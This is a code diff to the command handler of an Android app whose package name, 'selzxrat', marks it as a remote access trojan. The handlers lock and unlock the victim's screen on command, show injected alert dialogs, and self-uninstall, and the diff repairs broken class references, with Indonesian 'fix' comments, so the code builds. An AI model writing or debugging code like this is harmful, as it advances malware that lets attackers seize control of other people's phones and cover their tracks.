@@ -1,10 +1,10 @@
 package com.selzxrat.v5
 
-import com.selzxrat.v5.services.ScreenLocker
-import com.selzxrat.v5.ui.MainActivity
 import android.content.Context
 import android.content.Intent
 import android.util.Log
+import com.selzxrat.v5.services.ScreenLocker
+import com.selzxrat.v5.ui.MainActivity
 
 object CommandHandler {
     private const val TAG = "CommandHandler"
@@ -113,7 +113,8 @@ object CommandHandler {
     }
 
     private fun handleLockScreen(context: Context): CommandResult {
-        val intent = Intent(context, services.ScreenLocker::class.java).apply {
+        // PERBAIKAN: Gunakan ScreenLocker langsung, bukan services.ScreenLocker
+        val intent = Intent(context, ScreenLocker::class.java).apply {
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             putExtra("action", "lock")
         }
@@ -122,7 +123,8 @@ object CommandHandler {
     }
 
     private fun handleUnlockScreen(context: Context): CommandResult {
-        val intent = Intent(context, services.ScreenLocker::class.java).apply {
+        // PERBAIKAN: Gunakan ScreenLocker langsung
+        val intent = Intent(context, ScreenLocker::class.java).apply {
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             putExtra("action", "unlock")
         }
@@ -209,7 +211,8 @@ object CommandHandler {
     }
 
     private fun handleAlertDialog(context: Context, payload: String): CommandResult {
-        val intent = Intent(context, ui.MainActivity::class.java).apply {
+        // PERBAIKAN: Gunakan MainActivity langsung, bukan ui.MainActivity
+        val intent = Intent(context, MainActivity::class.java).apply {
             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             putExtra("show_alert", payload)
         }
@@ -223,7 +226,6 @@ object CommandHandler {
     }
 
     private fun handleSelfDestruct(context: Context): CommandResult {
-        // Clear all app data and uninstall
         try {
             val intent = Intent(Intent.ACTION_DELETE).apply {
                 data = android.net.Uri.parse("package:${context.packageName}")
